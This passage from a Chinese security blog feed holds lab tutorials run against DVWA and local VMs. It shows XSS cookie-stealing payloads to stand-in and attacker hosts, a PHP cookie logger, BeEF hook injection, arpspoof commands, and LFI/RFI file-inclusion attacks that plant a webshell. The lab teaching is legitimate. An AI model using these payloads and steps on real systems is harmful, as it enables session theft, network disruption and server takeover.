class="string">&quot;http://www.hacker.com/cookie.php?cookie=&quot;</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://www.hacker.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">img.width = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">img.height = <span class="number">0</span>;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h1 id="DVWA实验-手动"><a href="#DVWA实验-手动" class="headerlink" title="DVWA实验(手动)"></a>DVWA实验(手动)</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>首先把DVWA Security调成low级别并确定，然后点击XSS reflected</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251616110.png" alt="image-20220225161607996"></p><p>虽然已知该输入框存在XSS漏洞，但是平时我们可以先输入一个简单的脚本来测试一下是否真的有XSS漏洞，比如一个简单的弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;jason&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>粘贴到输入框并提交</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251617079.png" alt="image-20220225161743991"></p><p>确实有弹窗出现并把对应内容给显示了出来，说明这里有XSS漏洞，可以看到URL栏已经改变，这是一个带有XSS脚本的DVWA网站恶意链接，只要黑客把该URL发给其它用户，欺骗其它用户去点击(给个超链接什么的)，就会产生同样的效果，所以该效果可以用来欺骗登陆过该网站的用户，只要点击该链接，就会造成cookie泄露或者其它信息泄露</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS比反射型XSS更实用一点，存储型XSS只要用户不小心浏览到了该页面就会触发脚本，而反射型XSS需要用户点击该链接。</p><p>接下来我们模拟把每个浏览到该页面的用户的cookie保存到黑客的服务器中。这里我们把kali当做黑客存储cookie的服务器，打开kali中的apache服务</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251627291.png" alt="image-20220225162753969"></p><p>然后我们在web默认的路径/var/www/html/下创建一个名为cookie_rec.php(什么名都可以)的php脚本，用来创建cookie.txt并存储所拿到的用户的cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cookie_rec.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251629993.png" alt="image-20220225162948929"></p><p>因为我们的kali的IP地址为:192.168.29.137，所以我们制作一个攻击脚本用来把用户的cookie返回到黑客服务器中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">&#x27;http://192.168.29.137/cookie_rec.php?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们把该段代码输入到XSS stored模块中带有XSS漏洞的输入框中并提交，但是前端对输入内容有字数限制，所以我们F12利用查看器修改前端的代码，这里显示把输入框内容限制在50</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251646904.png" alt="image-20220225164617776"></p><p>我们改成200后粘贴脚本到输入框并且提交</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251702003.png" alt="image-20220225170230957"></p><p>然后就会出现一个空白页(而且还要用浏览器先允许弹窗！！！)，上面的URL会显示cookie信息和黑客的服务器IP(所以其实这种方法只是用来测试黑客的攻击方式，但其实现实生活中是不太可行的)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251647024.png" alt="image-20220225164706958"></p><p>然后再去kali文件看一下…好像没发现cookie.txt…后来又改了一下php的缩进还是不行，然后ls -l发现其实是权限不够(居然要提前把权限给到用户才行..所以这只是测试一下而已，现实生活中谁会这么黑！！)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251647238.png" alt="image-20220225164748159"></p><p>我们来把kali服务器中的文件权限给到DVWA用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data.www-data /var/www/</span><br></pre></td></tr></table></figure><p>再在输入框执行一遍脚本，然后就会把cookie生成到kali的cookie.txt了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251648731.png" alt="image-20220225164842646"></p><p>而且只要有用户浏览到该页面，都会执行该脚本，把自己的cookie信息提交到kali服务器中的cookie.txt</p><p>我们用其它浏览器来登录DVWA并浏览一下该网页(记得把DVWA security调到low，然后点击XSS stored并允许弹窗)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251705476.png" alt="image-20220225170557392"></p><p>这里显示其它浏览器的cookie是跟之前那个不一样的，然后我们再在kali中查看cookie.txt</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202251707701.png" alt="image-20220225170701639"></p><p>又有一个新的cookie存在里面了，所以只要用户点击该页面，就会暴露自己的cookie，所以存储型XSS比反射型XSS危害更大，且更实用</p><h1 id="自动化XSS-Beef"><a href="#自动化XSS-Beef" class="headerlink" title="自动化XSS(Beef)"></a>自动化XSS(Beef)</h1><p>手动化其实比较麻烦，如果能像sqlmap那样一款工具直接上手就好了，正好Beef就是这样一款自动化工具</p><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透； BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单</p><p>首先我们先启动kali中的apache服务，因为Beef也是需要apache提供web服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2   //在kali中启动apache</span><br></pre></td></tr></table></figure><p>因为我的kali版本是2021没有Beef，所以需要自己安装，详细安装步骤<a href="https://blog.csdn.net/weixin_43847838/article/details/110312851">参考这里</a></p><p>安装完成后即可打开Beef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beef-xss</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252047993.png" alt="image-20220225204721455"></p><p>如果是第一次打开，就要重新设置一下密码(默认账号密码都是beef)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252050369.png" alt="image-20220225205012269"></p><p>打开的时候有说明Beef的使用图形界面、钩子hook的使用和Script的一段hook使用脚本，非常贴心(127.0.0.1换成kali的IP)</p><p>登录到图形界面后账号是beef，密码是刚刚设置的密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252051259.png" alt="image-20220225205152210"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252054951.png" alt="image-20220225205401771"></p><p>登陆成功之后可以看到界面非常简洁，因为现在还没有上钩的主机</p><h2 id="上钩过程"><a href="#上钩过程" class="headerlink" title="上钩过程"></a>上钩过程</h2><p>我们在物理机(IP为192.168.1.11)把刚刚beef提供的Script脚本粘贴到DVWA的XSS存储模块XSS stored的输入框中，把127.0.0.1换成kali的IP地址，我的kali的IP地址为：192.168.29.137</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.29.137:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252057778.png" alt="image-20220225205715707"></p><p>提交之后先上钩的是自己的主机，因为提交之后会自动刷新页面，可以在beef中看到已经上钩了，文件夹的名字是该网页服务器的IP，但是上钩的IP地址为192.168.29.1，也不是物理机的IP地址，因为192.168.29.1是VMnet8，物理机的虚拟网卡的IP，物理机和虚拟机之间通信就是通过虚拟网卡来通信的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252059194.png" alt="image-20220225205937122"></p><p>这里我们再在kali(攻击机)和win7(搭建DVWA的主机)中用浏览器打开XSS stored页面，看看上钩的IP地址是多少(记得每次登陆把DVWA security模式调为Low)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252109546.png" alt="image-20220225210907454"></p><p>可以看到 kali的IP：192.168.29.137和win7的IP：192.168.29.140都已经上钩了，而且状态是浏览器正在这个页面(Online)，而物理机的浏览器已经关掉了这个页面所以状态是Offline</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/tugenhua0707/p/10909284.html">https://www.cnblogs.com/tugenhua0707/p/10909284.html</a></p><p><a href="https://www.bilibili.com/video/BV1E4411L7zS?p=19">https://www.bilibili.com/video/BV1E4411L7zS?p=19</a></p>]]></content>
    
    
    <summary type="html">XSS的原理及简单实验</summary>
    
    
    
    <category term="DVWA" scheme="https://jason177.com/categories/DVWA/"/>
    
    
    <category term="XSS" scheme="https://jason177.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>ARP的原理及欺骗</title>
    <link href="https://jason177.com/2022/02/22/arp-spoofing/"/>
    <id>https://jason177.com/2022/02/22/arp-spoofing/</id>
    <published>2022-02-22T12:08:18.000Z</published>
    <updated>2022-02-25T03:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><p>ARP(Address Resolution Protocol，地址解析协议)是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><p>ARP协议基本功能：<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址，收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>ARP被利用的原因：地址解析协议是建立在网络中各个主机互相信任的基础上的，<strong>局域网络上的主机</strong>可以自主发送ARP应答消息，其他主机收到应答报文时<strong>不会检测</strong>该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97">ARP欺骗</a>。</p><p>工作流程：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><p>主机A的IP地址：192.168.1.1 , MAC地址：0A-11-22-33-44-01</p><p>主机B的IP地址：192.168.1.2，MAC地址：0A-11-22-33-44-02</p><p>当主机A想要与主机B通信时，ARP可以将主机B的IP地址解析成主机B的MAC地址然后缓存到主机A中，下次访问就直接检查本地ARP缓存。</p><ol><li>一开始主机A想要访问IP地址为192.168.1.2的主机B，所以先在自己本地ARP缓存中检查192.168.1.2所匹配的MAC地址</li><li>如果主机A没有在ARP缓存中找到IP与MAC的映射，它将会把ARP请求帧广播到本地网络上的所有主机，源主机A的IP地址和MAC地址都包含在ARP请求中。局域网中的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，则丢弃ARP请求包。</li><li>主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和主机A的MAC地址映射添加本地ARP缓存中。</li><li>主机B将包含着主机B的MAC地址的ARP回复消息返回给主机A，主机A在本地更新主机B的IP地址和主机B的MAC地址映射缓存。</li><li>本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</li></ol></div><p>ARP攻击的攻击原理：ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>常见的ARP欺骗手法：同时对局域网内的一台主机和网关进行ARP欺骗，更改这台主机和网关的ARP缓存表。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222102954.jpeg" alt="img"></p><p><a href="https://blog.csdn.net/vaeloverforever/article/details/84504876">参考链接</a></p><h2 id="ARP欺骗实验"><a href="#ARP欺骗实验" class="headerlink" title="ARP欺骗实验"></a>ARP欺骗实验</h2><p>实验环境：</p><ol><li>靶机：win7（IP地址：192.168.29.140，MAC地址：00-0C-29-3A-FE-31）</li><li>攻击机：kali（IP地址：192.168.29.137，MAC地址：00:0c:29:d5:b6:5d）</li><li>工具：kali下的arpspoof</li></ol><h3 id="使用arpspoof进行ARP断网"><a href="#使用arpspoof进行ARP断网" class="headerlink" title="使用arpspoof进行ARP断网"></a>使用arpspoof进行ARP断网</h3><p>请注意：ARP欺骗只适用于同一局域网内，上面就说过了:)</p><p>查看靶机的IP地址和MAC地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig -all</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222124735.png" alt="image-20220222212451572"></p><p>查看攻击机kali的IP地址、MAC地址和网卡</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222126549.png" alt="image-20220222212612492"></p><p>在攻击机中通过<a href="https://www.cnblogs.com/catlee/p/7360127.html">fping命令</a>查看当前局域网内存在的主机，以此来寻找可攻击的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -g 192.168.29.0/24    //ping 192.168.29.0网段的所有存活主机</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222130205.png" alt="image-20220222213007115"></p><p>192.168.29.1是物理机的VMnet8的虚拟网卡，192.168.29.2是虚拟机网关</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222138375.png" alt="image-20220222213755188"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222138328.png" alt="image-20220222213820291"></p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222142628.png" alt="image-20220222214044724"></p><p>192.168.29.137是kali本机，192.168.29.140是win7靶机，对于kali来说，win7相当于局域网内的另一台主机，可以进行攻击。</p><p>在进行攻击前，先ping一下win7靶机的ip地址192.168.29.140查看是否可以进行通信</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222144060.png" alt="image-20220222214412012"></p><p>可以通信，为了查看win7中的ARP缓存是否有被修改，在攻击之前先看一下win7中的ARP本地缓存</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222146816.png" alt="image-20220222214608764"></p><p>可以看到kali的IP地址192.168.29.137对应的MAC地址为00:0c:29:d5:b6:5d，网关的IP地址192.168.29.2对应的MAC地址为00-50-56-e4-36-8c</p><p>然后查看一下呗攻击之前win7的上网状态，ping一下百度</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222148348.png" alt="image-20220222214818307"></p><p>没有包丢失，说明此时被攻击主机可以上网</p><p>在kali中打开arpspoof工具，对物理机发起ARP攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.29.140 192.168.29.2    //i参数后面接kali的网卡，t参数后面接要攻击的主机ip和网关</span><br></pre></td></tr></table></figure><p>意思是要接管要攻击的主机发往网关的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222152043.png" alt="image-20220222215236964"></p><p>可以看到kali正在向win7发送ARP应答包，这个应答包将网关的IP地址192.168.29.2和kali的MAC地址00:0c:29:d5:b6:5d绑定起来，从而更改win7中的ARP缓存表，缓存表中网关的MAC地址变更为kali的MAC地址00:0c:29:d5:b6:5d，每次发往网关192.168.29.2的数据包都将会发给MAC地址为00:0c:29:d5:b6:5d的kali</p><p>查看win7是否还能ping通百度</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222155741.png" alt="image-20220222215537699"></p><p>已经ping不通百度，打开浏览器看是否可以上网</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222157137.png" alt="image-20220222215714041"></p><p>已经打不开新浪网，再查看一下ARP缓存表</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222156561.png" alt="image-20220222215652523"></p><p>可以看到网关对应的MAC地址已经变成kali的MAC地址了，网关192.168.29.2对应的MAC地址和kali的MAC地址一模一样，所以该win7已经遭遇了ARP攻击</p><p>在kali终端中ctrl+c停止发送ARP应答包之后，在win7刷新一下浏览器，就可以正常上网了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222200870.png" alt="image-20220222220046786"></p><p>再查看ARP缓存表，网关的MAC地址又恢复了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222202166.png" alt="image-20220222220201109"></p><p>ARP欺骗可以截获被攻击主机的一些隐私信息等，通过arpspoof和driftnet就可以截获到被攻击机的图片，<a href="https://blog.csdn.net/vaeloverforever/article/details/84504876">可以看这里</a>，下面就不再过多叙说</p>]]></content>
    
    
    <summary type="html">简单描述ARP的原理以及实操</summary>
    
    
    
    <category term="Kali" scheme="https://jason177.com/categories/Kali/"/>
    
    
    <category term="ARP" scheme="https://jason177.com/tags/ARP/"/>
    
  </entry>
  
  <entry>
    <title>File-Inclusion</title>
    <link href="https://jason177.com/2022/02/20/file-inclusion/"/>
    <id>https://jason177.com/2022/02/20/file-inclusion/</id>
    <published>2022-02-20T11:50:03.000Z</published>
    <updated>2022-02-21T02:55:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File-Inclusion"></a>File-Inclusion</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>File-Inclusion：文件包含，是在开发人员希望代码更加灵活的时候将被包含的文件设置为变量用来进行动态调用(其实就是把重复使用的函数写到单个文件中，需要使用这个函数的时候就直接调用该文件而无需再次编写)，本身文件包含就是一个正常行为，但是如果没有其它过滤手段，就会导致客户端可以调用一个恶意的文件，造成文件包含漏洞。</p></div><p><a href="https://blog.csdn.net/qq_39431542/article/details/88628225">参考链接1</a></p><p><a href="https://www.bilibili.com/video/BV1E4411L7zS">参考链接2</a></p><h2 id="漏洞的场景与利用条件"><a href="#漏洞的场景与利用条件" class="headerlink" title="漏洞的场景与利用条件"></a>漏洞的场景与利用条件</h2><p>一般在PHP中出现文件包含。服务器执行PHP文件时，可以通过包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。</p><p> 漏洞利用条件：</p><ol><li><strong>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</strong></li><li><strong>用户能够控制该动态变量</strong></li><li><strong>要保证php.ini中allow_url_fopen和allow_url_include为On</strong></li></ol><p>而需要注意的是：</p><ol><li><strong>PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析</strong></li><li><strong>若文件内容不符合PHP语法规范则会暴露源码</strong></li><li>PHP4存在远程文件包含与本地文件包含，但是PHP5只存在本地文件包含</li></ol><p>接下来我会通过DVWA里的File Inclusion模块来讲解本地包含漏洞和远程包含漏洞(虽然简单，但是其实我就是来水一下文章的)</p><p>在这之前我们先看一下各系统中的敏感文件</p><p><strong>Windows</strong>:</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202146734.png" alt="image-20220220214621088"></p><p><strong>Linux/Unix:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202147589.png" alt="image-20220220214720435"></p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><p>首先在DVWA中在DVWA Security中把模式调成Low，然后点击File Inclusion模块</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202149937.png" alt="image-20220220214953868"></p><p>在上面URL栏中可以看到后面的”?page=include.php”，说明在index.php(默认网页，上面没有显示)中存在着文件包含的功能，且当前包含的文件是”page=”后面的include.php文件</p><p>而如果当前目录没有该文件的话则会出现警告</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202159034.png" alt="image-20220220215946971"></p><p>phpinfo.php文件在dvwa的根目录下，可以根据相对路径来查看该文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202201216.png" alt="image-20220220220110140"></p><p>也可以根据绝对路径来查看该文件或者其他文件，比如我在C:\phpstudy中创建一个名为”jason.txt”的文件，内容是”hello world”，且我的虚拟机IP为：192.168.29.140，则：如果是Windows从物理机中访问该文件的URL是”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=C:/phpstudy/jason.txt&quot;">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=C:/phpstudy/jason.txt&quot;</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210134875.png" alt="image-20220221013434770"></p><p>可以访问该文件并且显示在页面中，说明确实有文件包含漏洞，这样的话就可以依靠内容的回显把系统的一些隐私信息显示到页面中，比如如果是Linux的系统，则可以查看”/etc/passwd”下的信息，即”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=/etc/passwd&quot;%E3%80%82**%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E8%A6%81%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E8%AF%A5%E7%BD%91%E7%AB%99%E6%98%AFWindows%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E7%9A%84%E8%BF%98%E6%98%AFLinux%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E3%80%82">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=/etc/passwd&quot;。**所以如果要访问文件需要知道该网站是Windows系统搭建的还是Linux系统搭建的，因为绝对路径的使用方法是不一样的。</a>**</p><p>如果一个网站文件上传没有漏洞的话，我们可以把生成木马的php语句放在图片中，然后利用文件包含的漏洞，打开带有php语句的图片，就可以在后台中生成木马。</p><p>我们在网上找到一张jpg图片(好像是越小越好，可能是插入php语句破坏文件的概率会小一点)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210425176.png" alt="image-20220221042537137"></p><p>然后把jpg图片拖进edjpgcom.exe(用其他方法也行)，在弹出来的输入框中输入会生成一句话木马的php语句，然后一张”被插入”php语句的jpg图片就做好了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210427695.png" alt="image-20220221042727642"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210425588.png" alt="image-20220221042501531"></p><p>这里php语句的内容是被执行后生成shell25.php文件，而该shell25.php文件的内容就是后面那串一句话木马</p><p>然后我们在DVWA中把级别调成Low，然后在File Upload文件上传中把该图片文件shell.jpg上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210428245.png" alt="image-20220221042836194"></p><p>然后把提示的路径复制下来，再打开File Inclusion文件包含模块，把”../../hackable/uploads/shell.jpg”复制到”page=”后面，即：<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210420899.png" alt="image-20220221042017821"></p><p>出现了图片文件中的乱码，说明执行图片成功了，刚刚的shell.jpg就会生成shell25.php，且密码是”yangge”，我们可以在DVWA的后台看到确实生成了shell25.php</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210421379.png" alt="image-20220221042138314"></p><p>然后我们打开菜刀或者蚁剑等连接木马的工具进行连接。请注意：生成的shell25.php不是在图片上传的位置，而是在文件包含漏洞的当前位置，即：<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/">http://192.168.29.140/dvwa/vulnerabilities/fi/</a> 。所以URL地址为”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/shell25.php&quot;">http://192.168.29.140/dvwa/vulnerabilities/fi/shell25.php&quot;</a> ，连接密码为”yangge”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210436974.png" alt="image-20220221043647920"></p><p>点击左上角添加之后，就可以连接到DVWA的机器后台了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210438860.png" alt="image-20220221043809780"></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p> 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>Allow_url_include = on</p><p><strong>在使用远程包含时，不能包含.php文件，否则会执行不成功，所以一般包含的是txt文件。但是可以执行.php文件中的echo输出语句。</strong></p><p>远程文件包含意思就是在本地的文件中把远程的文件包含进来，通俗来说就是访问远程服务器的链接来包含远程文件。所以远程文件包含比本地文件包含更简单一点，因为远程文件包含可以在远程服务器中准备好我们的木马，只要把远程带有木马的文件路径写在带有漏洞的URL中即可。</p><p>现在我们把kali当成远程服务器，在kali中打开apache2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210441791.png" alt="image-20220221044100663"></p><p>打开apache2之后我们就可以通过kali的ip地址访问到默认网页，这里我的kali的ip地址为：192.168.29.137</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210442761.png" alt="image-20220221044226685"></p><p>然后kali的apache默认路径为：/var/www/html/ ， 所以我们在该路径下写一个123.txt文件，里面的内容依然是可以生成一句话木马的php语句</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210456854.png" alt="image-20220221045627722"></p><p>所以该文件的路径为：192.168.29.137/123.txt</p><p>所以我们把该路径放在”page=”后面，即可把该路径中会生成木马的123.txt包含到192.168.29.140这台主机的文件中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210502544.png" alt="image-20220221050223493"></p><p>这里什么也没显示说明成功了，因为它只是一个txt文件</p><p>这里我们再次利用蚁剑，清空刚才的数据以及缓存之后重新连接新的一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210504732.png" alt="image-20220221050425673"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210504989.png" alt="image-20220221050433900"></p><p>连接成功，并且可以看到shell30.php已经存在于默认路径中</p>]]></content>
    
    
    <summary type="html">本地文件包含和远程文件包含</summary>
    
    
    
    <category term="DVWA" scheme="https://jason177.com/categories/DVWA/"/>
    
    
    <category term="FIle-Inclusion" scheme="https://jason177.com/tags/FIle-Inclusion/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit的简单使用</title>
    <link href="https://jason177.com/2021/12/09/metasploit/"/>
    <id>https://jason177.com/2021/12/09/metasploit/</id>
    <published>2021-12-09T14:05:53.000Z</published>
    <updated>2021-12-09T14:10:53.000Z</updated>
    
